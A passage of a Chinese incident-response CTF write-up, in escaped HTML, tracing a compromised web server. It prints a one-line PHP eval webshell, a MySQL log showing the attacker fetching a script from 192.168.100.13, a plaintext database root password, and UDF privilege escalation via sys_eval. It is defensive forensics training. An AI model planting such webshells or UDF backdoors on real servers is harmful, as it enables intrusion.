l写入shell应该是写入\u003ccode\u003eWebshell\u003c/code\u003e ，那么我们要去网站目录找\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@xuanji:/var/www/html# grep -rE \u003cspan class=\"hljs-string\"\u003e'@eval'\u003c/span\u003e ./\n./sh.php:1      2       \u0026#x3C;?php @\u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e]);?\u003e     4\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看以下\u003ccode\u003e./sh.php\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@xuanji:/var/www/html# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e ./sh.php \n1       2       \u0026#x3C;?php @\u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e]);?\u003e     4\n//ccfda79e-7aa1-4275-bc26-a6189eb9a20b\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么第一个Flag就是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eflag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e黑客反弹 shell 的ip，flag{ip}\u003c/p\u003e\n\u003cp\u003e寻找数据库日志，发现只有\u003ccode\u003eerror.log\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@xuanji:/var/log/mysql# \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 8\ndrwxr-s---. 1 mysql adm      23 Jul 31  2023 .\ndrwxrwxr-x. 1 root  syslog   46 Jul 31  2023 ..\n-rw-rw----. 1 mysql adm    6238 Mar 26 15:10 error.log\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看，可以在里面找到一个IP，\u003ccode\u003e192.168.100.13\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e230731 10:14:49 [Note] /usr/sbin/mysqld: ready \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e connections.\nVersion: \u003cspan class=\"hljs-string\"\u003e'5.5.64-MariaDB-1ubuntu0.14.04.1'\u003c/span\u003e  socket: \u003cspan class=\"hljs-string\"\u003e'/var/run/mysqld/mysqld.sock'\u003c/span\u003e  port: 3306  (Ubuntu)\nsh: 1: curl: not found\n--2023-08-01 02:14:11--  http://192.168.100.13:771/\nConnecting to 192.168.100.13:771... connected.\nHTTP request sent, awaiting response... 200 No headers, assuming HTTP/0.9\nLength: unspecified\nSaving to: \u003cspan class=\"hljs-string\"\u003e'index.html'\u003c/span\u003e\n\n     0K                                                        2.46 =2.0s\n\n2023-08-01 02:14:13 (2.46 B/s) - \u003cspan class=\"hljs-string\"\u003e'index.html'\u003c/span\u003e saved [5]\n\n/tmp/1.sh: line 1: --2023-08-01: \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e not found\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么Flag就是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eflag{192.168.100.13}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx\u003c/p\u003e\n\u003cp\u003e假如我们是黑客，黑到了服务器是普通用户，然后需要提权，我们应该想会去找密码，例如数据库密码，并且假如数据库的用户是\u003ccode\u003eroot\u003c/code\u003e并且\u003ccode\u003esecure_file_priv\u003c/code\u003e 为空，则就可以使用\u003ccode\u003eUDF\u003c/code\u003e提权\u003c/p\u003e\n\u003cp\u003e先去找数据库账户密码，在\u003ccode\u003ecommon.php\u003c/code\u003e中可以找到\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@xuanji:/var/www/html# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e common.php \n\u0026#x3C;?php\n\u003cspan class=\"hljs-variable\"\u003e$conn\u003c/span\u003e=mysqli_connect(\u003cspan class=\"hljs-string\"\u003e\"localhost\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"root\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"334cc35b3c704593\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"cms\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"3306\"\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(!\u003cspan class=\"hljs-variable\"\u003e$conn\u003c/span\u003e){\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"数据库连接失败\"\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登录数据库后，查看插件目录路径\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [(none)]\u003e SHOW VARIABLES LIKE \u003cspan class=\"hljs-string\"\u003e\"secure_file_priv\"\u003c/span\u003e;\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_file_priv |       |\n+------------------+-------+\n1 row \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (0.00 sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e是为空，则会有\u003ccode\u003eUDF\u003c/code\u003e提权，那么在\u003ccode\u003e/usr/lib/mysql/plugin\u003c/code\u003e 可能就会留下痕迹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@xuanji:/tmp# \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /usr/lib/mysql/plugin/\ntotal 4752\ndrwxr-xr-x. 1 mysql mysql      39 Aug  1  2023 .\ndrwxr-xr-x. 1 root  root       20 Jul 31  2023 ..\n-rw-r--r--. 1 mysql mysql   10416 May 16  2019 auth_pam.so\n-rw-r--r--. 1 mysql mysql    6464 May 16  2019 auth_socket.so\n-rw-r--r--. 1 mysql mysql   10200 May 16  2019 dialog.so\n-rw-r--r--. 1 mysql mysql 1600136 May 16  2019 ha_innodb.so\n-rw-r--r--. 1 mysql mysql  159304 May 16  2019 handlersocket.so\n-rw-r--r--. 1 mysql mysql    6104 May 16  2019 mysql_clear_password.so\n-rw-rw-rw-. 1 mysql mysql   10754 Aug  1  2023 mysqludf.so\n-rw-r--r--. 1 mysql mysql   39944 May 16  2019 semisync_master.so\n-rw-r--r--. 1 mysql mysql   14736 May 16  2019 semisync_slave.so\n-rw-r--r--. 1 mysql mysql   55696 May 16  2019 server_audit.so\n-rw-r--r--. 1 mysql mysql 2918008 May 16  2019 sphinx.so\n-rw-r--r--. 1 mysql mysql   11008 May 16  2019 sql_errlog.so\n-rw-rw-rw-. 1 mysql mysql      34 Aug  1  2023 udf.so\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e很明显，\u003ccode\u003eudf.so\u003c/code\u003e 是提权的文件\u003c/p\u003e\n\u003cp\u003e那么\u003ccode\u003eFlag\u003c/code\u003e就是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@xuanji:/tmp# \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -n \u003cspan class=\"hljs-string\"\u003e\"/usr/lib/mysql/plugin/udf.so\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003emd5sum\u003c/span\u003e\nb1818bde4e310f3d23f1005185b973e7  -\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eflag{b1818bde4e310f3d23f1005185b973e7}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e黑客获取的权限 flag{whoami后的值}\u003c/p\u003e\n\u003cp\u003e我们直接去找自定义函数\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [(none)]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from mysql.func;\n+----------+-----+-------------+----------+\n| name     | ret | dl          | \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e     |\n+----------+-----+-------------+----------+\n| sys_eval |   0 | mysqludf.so | \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e |\n+----------+-----+-------------+----------+\n1 row \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (0.00 sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用自定义函数执行\u003ccode\u003ewhoami\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [(none)]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e sys_eval(\u003cspan class=\"hljs-string\"\u003e'whoami'\u003c/span\u003e);\n+--------------------+\n| sys_eval(\u003cspan class=\"hljs-string\"\u003e'
